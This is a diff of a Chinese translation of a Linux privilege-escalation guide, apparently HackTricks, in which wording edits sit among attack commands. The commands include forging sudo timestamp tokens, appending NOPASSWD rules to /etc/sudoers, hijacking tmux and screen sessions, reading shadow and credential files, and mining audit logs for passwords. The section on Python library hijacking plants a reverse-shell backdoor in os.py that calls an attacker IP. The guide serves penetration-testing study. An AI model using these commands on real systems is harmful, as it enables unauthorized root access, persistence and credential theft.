-如果您在该文件夹或文件夹内创建的任何文件中具有**写权限**，则可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来**为用户和PID创建sudo令牌**。\
-例如，如果您可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且您以该用户的身份拥有PID 1234的shell，则可以**获得sudo权限**而无需知道密码，方法是：
+如果您在该文件夹或文件夹内创建的任何文件中具有**写权限**，则可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **为用户和PID创建sudo令牌**。\
+例如，如果您可以覆盖文件 _/var/run/sudo/ts/sampleuser_ 并且您以该用户的身份拥有PID 1234的shell，则可以**获得sudo权限**而无需知道密码，方法是：
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
 ```
@@ -959,7 +959,7 @@ sudo su
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
 ```
-如果你会写代码，你就可以滥用这个权限。
+如果你会写，你就可以滥用这个权限。
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
@@ -1006,7 +1006,7 @@ sudo ls
 
 这意味着将读取来自 `/etc/ld.so.conf.d/*.conf` 的配置文件。这些配置文件 **指向其他文件夹**，在这些文件夹中将 **搜索** **库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统将在 `/usr/local/lib` 内搜索库**。
 
-如果出于某种原因 **用户对任何指示的路径具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内的任何文件或 `/etc/ld.so.conf.d/*.conf` 内的配置文件中的任何文件夹，他可能能够提升权限。\
+如果由于某种原因 **用户对任何指示的路径具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内的任何文件或 `/etc/ld.so.conf.d/*.conf` 内的配置文件中的任何文件夹，他可能能够提升权限。\
 请查看 **如何利用此错误配置** 在以下页面：
 
 {{#ref}}
@@ -1048,8 +1048,8 @@ execve(file,argv,0);
 ```
 ## Capabilities
 
-Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
-Read the following page to **learn more about capabilities and how to abuse them**:
+Linux capabilities 提供了一个 **可用根权限的子集给一个进程**。这有效地将根 **权限分解为更小且独特的单元**。每个单元可以独立授予给进程。通过这种方式，完整的权限集被减少，从而降低了被利用的风险。\
+阅读以下页面以 **了解更多关于能力及其滥用的方法**：
 
 {{#ref}}
 linux-capabilities.md
@@ -1057,14 +1057,14 @@ linux-capabilities.md
 
 ## Directory permissions
 
-在目录中，**“执行”**位意味着受影响的用户可以“**cd**”进入该文件夹。\
-**“读取”**位意味着用户可以**列出**文件，而**“写入”**位意味着用户可以**删除**和**创建**新**文件**。
+在一个目录中，**“执行”**位意味着受影响的用户可以“**cd**”进入该文件夹。\
+**“读取”**位意味着用户可以 **列出** **文件**，而 **“写入”**位意味着用户可以 **删除** 和 **创建** 新的 **文件**。
 
 ## ACLs
 
-访问控制列表（ACLs）代表了可自由裁量权限的第二层，能够**覆盖传统的ugo/rwx权限**。这些权限通过允许或拒绝特定用户（非所有者或组成员）访问文件或目录，从而增强了对访问的控制。这种**粒度确保了更精确的访问管理**。更多细节可以在[**这里**](https://linuxconfig.org/how-to-manage-acls-on-linux)找到。
+访问控制列表 (ACLs) 代表了可自由裁量权限的第二层，能够 **覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝特定用户（非所有者或不属于该组的用户）访问文件或目录，从而增强了对访问的控制。这种 **粒度确保了更精确的访问管理**。更多细节可以在 [**这里**](https://linuxconfig.org/how-to-manage-acls-on-linux) 找到。
 
-**给予**用户“kali”对文件的读取和写入权限：
+**给予** 用户 "kali" 对一个文件的读取和写入权限：
 ```bash
 setfacl -m u:kali:rw file.txt
 #Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)
@@ -1077,8 +1077,8 @@ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
 ## 打开 shell 会话
 
-在 **旧版本** 中，您可能会 **劫持** 其他用户 (**root**) 的一些 **shell** 会话。\
-在 **最新版本** 中，您将只能 **连接** 到 **您自己的用户** 的屏幕会话。然而，您可能会在会话中找到 **有趣的信息**。
+在 **旧版本** 中，您可以 **劫持** 不同用户 (**root**) 的一些 **shell** 会话。\
+在 **最新版本** 中，您只能 **连接** 到 **您自己用户** 的屏幕会话。然而，您可能会在会话中找到 **有趣的信息**。
 
 ### 屏幕会话劫持
 
@@ -1117,14 +1117,14 @@ rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs c
 # If you are root or devs you can access it
 tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
 ```
-检查 **HTB 的情人节盒子** 以获取示例。
+检查 **Valentine box from HTB** 以获取示例。
 
 ## SSH
 
 ### Debian OpenSSL 可预测的 PRNG - CVE-2008-0166
 
-在 2006 年 9 月到 2008 年 5 月 13 日之间生成的所有 Debian 基于系统（Ubuntu、Kubuntu 等）的 SSL 和 SSH 密钥可能受到此漏洞的影响。\
-此漏洞是在这些操作系统中创建新 ssh 密钥时造成的，因为 **仅有 32,768 种变体是可能的**。这意味着所有可能性都可以计算，并且 **拥有 ssh 公钥后，您可以搜索相应的私钥**。您可以在这里找到计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（如 Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受到此漏洞的影响。\
+此漏洞是在这些操作系统中创建新 ssh 密钥时造成的，因为 **仅可能有 32,768 种变体**。这意味着所有可能性都可以计算，并且 **拥有 ssh 公钥后，您可以搜索相应的私钥**。您可以在此处找到计算的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
 ### SSH 有趣的配置值
 
@@ -1151,19 +1151,19 @@ AuthorizedKeysFile    .ssh/authorized_keys access
 
 ### ForwardAgent/AllowAgentForwarding
 
-SSH代理转发允许您**使用本地SSH密钥而不是将密钥**（没有密码短语！）放在服务器上。因此，您将能够**通过ssh跳转到一个主机**，然后从那里**跳转到另一个**主机**，使用**位于您**初始主机**中的**密钥**。
+SSH代理转发允许您**使用本地SSH密钥而不是将密钥**（没有密码短语！）留在服务器上。因此，您将能够**通过ssh跳转到一个主机**，然后从那里**跳转到另一个**主机**，使用**位于您**初始主机**中的**密钥**。
 
 您需要在`$HOME/.ssh.config`中设置此选项，如下所示：
 ```
 Host example.com
 ForwardAgent yes
 ```
-注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机将能够访问密钥（这是一种安全问题）。
+注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机将能够访问密钥（这是一项安全问题）。
 
 文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝此配置。\
 文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent 转发（默认是允许）。
 
-如果您发现转发代理在某个环境中配置，请阅读以下页面，因为 **您可能能够利用它来提升权限**：
+如果你发现在某个环境中配置了 Forward Agent，请阅读以下页面，因为 **你可能能够利用它来提升权限**：
 
 {{#ref}}
 ssh-forward-agent-exploitation.md
@@ -1173,15 +1173,15 @@ ssh-forward-agent-exploitation.md
 
 ### 配置文件
 
-文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是 **在用户运行新 shell 时执行的脚本**。因此，如果您可以 **写入或修改其中任何一个，您可以提升权限**。
+文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是 **在用户运行新 shell 时执行的脚本**。因此，如果你可以 **写入或修改其中任何一个，你可以提升权限**。
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
-如果发现任何奇怪的配置文件脚本，您应该检查其中是否包含**敏感细节**。
+如果发现任何奇怪的配置文件脚本，您应该检查其中是否包含**敏感信息**。
 
 ### Passwd/Shadow 文件
 
-根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能有备份。因此，建议**找到所有这些文件**并**检查您是否可以读取**它们，以查看**文件中是否包含哈希**：
+根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份。因此，建议**找到所有这些文件**并**检查您是否可以读取**它们，以查看**文件中是否包含哈希**：
 ```bash
 #Passwd equivalent files
 cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
@@ -1231,7 +1231,7 @@ Group=root
 
 ### 检查文件夹
 
-以下文件夹可能包含备份或有趣的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（可能您无法读取最后一个，但可以尝试）
+以下文件夹可能包含备份或有趣的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（您可能无法读取最后一个，但可以尝试）
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
@@ -1252,7 +1252,7 @@ find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -pat
 done
 done
 ```
-### 最近几分钟内修改的文件
+### 最近修改的文件
 ```bash
 find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
 ```
@@ -1292,7 +1292,7 @@ find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/gam
 ### 日志
 
 如果您可以读取日志，您可能会在其中找到**有趣/机密的信息**。日志越奇怪，可能越有趣。\
-此外，一些“**错误**”配置（后门？）的**审计日志**可能允许您**在审计日志中记录密码**，正如在这篇文章中所解释的：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
+此外，一些“**错误**”配置的（后门？）**审计日志**可能允许您**在审计日志中记录密码**，正如在这篇文章中所解释的：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
@@ -1312,14 +1312,14 @@ grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
 ### Generic Creds Search/Regex
 
-您还应该检查包含“**password**”一词的文件，无论是在**名称**中还是在**内容**中，并检查日志中的IP和电子邮件，或哈希正则表达式。\
+您还应该检查包含“**password**”的文件，无论是在**名称**中还是在**内容**中，并检查日志中的IP和电子邮件，或哈希正则表达式。\
 我不会在这里列出如何做到这一切，但如果您感兴趣，可以查看[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)执行的最后检查。
 
 ## Writable files
 
 ### Python library hijacking
 
-如果您知道**从哪里**将执行python脚本，并且您**可以在**该文件夹中写入或**修改python库**，您可以修改OS库并进行后门（如果您可以写入python脚本将要执行的位置，请复制并粘贴os.py库）。
+如果您知道**从哪里**将要执行python脚本，并且您**可以在**该文件夹中写入或**修改python库**，您可以修改OS库并进行后门（如果您可以写入python脚本将要执行的位置，请复制并粘贴os.py库）。
 
 要**对库进行后门**，只需在os.py库的末尾添加以下行（更改IP和端口）：
 ```python
@@ -1327,12 +1327,12 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ```
 ### Logrotate 利用
 
-`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户潜在地获得提升的权限。这是因为 `logrotate` 通常以 **root** 身份运行，可以被操控以执行任意文件，特别是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是要检查 _/var/log_ 中的权限，也要检查应用日志轮换的任何目录中的权限。
+`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户潜在地获得提升的权限。这是因为 `logrotate` 通常以 **root** 身份运行，可以被操控以执行任意文件，特别是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是要检查 _/var/log_ 中的权限，也要检查应用日志轮换的任何目录。
 
 > [!NOTE]
 > 此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本
 
-有关该漏洞的更多详细信息，请访问此页面：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。
+有关该漏洞的更详细信息可以在此页面找到：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。
 
 您可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用此漏洞。
 
@@ -1344,7 +1344,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 如果出于某种原因，用户能够 **写入** 一个 `ifcf-<whatever>` 脚本到 _/etc/sysconfig/network-scripts_ **或** 可以 **调整** 一个现有的脚本，那么您的 **系统就被攻陷了**。
 
-网络脚本，例如 _ifcg-eth0_ 用于网络连接。它们看起来与 .INI 文件完全相同。然而，它们在 Linux 中由网络管理器（dispatcher.d）\~sourced\~。
+网络脚本，例如 _ifcg-eth0_ 用于网络连接。它们看起来与 .INI 文件完全相同。然而，它们在 Linux 上由网络管理器（dispatcher.d）进行 \~sourced\~。
 
 在我的案例中，这些网络脚本中的 `NAME=` 属性处理不当。如果您在名称中有 **空白/空格，系统会尝试执行空白/空格后面的部分**。这意味着 **第一个空格后面的所有内容都以 root 身份执行**。
 
@@ -1356,11 +1356,11 @@ DEVICE=eth0
 ```
 ### **init, init.d, systemd 和 rc.d**
 
-目录 `/etc/init.d` 是 **System V init (SysVinit)** 的 **脚本** 的家。它包括用于 `start`、`stop`、`restart` 和有时 `reload` 服务的脚本。这些可以直接执行或通过在 `/etc/rc?.d/` 中找到的符号链接执行。在 Redhat 系统中，另一个路径是 `/etc/rc.d/init.d`。
+目录 `/etc/init.d` 是 **System V init (SysVinit)** 的 **脚本** 的家，**经典的 Linux 服务管理系统**。它包括用于 `start`、`stop`、`restart` 和有时 `reload` 服务的脚本。这些可以直接执行或通过在 `/etc/rc?.d/` 中找到的符号链接执行。在 Redhat 系统中，另一个路径是 `/etc/rc.d/init.d`。
 
-另一方面，`/etc/init` 与 **Upstart** 相关，这是由 Ubuntu 引入的较新的 **服务管理**，使用配置文件进行服务管理任务。尽管已经过渡到 Upstart，但由于 Upstart 中的兼容性层，SysVinit 脚本仍与 Upstart 配置一起使用。
+另一方面，`/etc/init` 与 **Upstart** 相关，这是 Ubuntu 引入的较新的 **服务管理**，使用配置文件进行服务管理任务。尽管过渡到 Upstart，SysVinit 脚本仍然与 Upstart 配置一起使用，因为 Upstart 中有一个兼容层。
 
-**systemd** 作为现代初始化和服务管理器出现，提供了高级功能，如按需守护进程启动、自动挂载管理和系统状态快照。它将文件组织到 `/usr/lib/systemd/` 用于分发包和 `/etc/systemd/system/` 用于管理员修改，从而简化了系统管理过程。
+**systemd** 作为现代初始化和服务管理器出现，提供了高级功能，如按需守护进程启动、自动挂载管理和系统状态快照。它将文件组织到 `/usr/lib/systemd/` 以供分发包使用，并将 `/etc/systemd/system/` 用于管理员修改，从而简化系统管理过程。
 
 ## 其他技巧
 
@@ -1393,7 +1393,7 @@ cisco-vmanage.md
 
 ## Linux/Unix 权限提升工具
 
-### **查找 Linux 本地权限提升向量的最佳工具:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+### **查找 Linux 本地权限提升向量的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 选项)\
 **Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
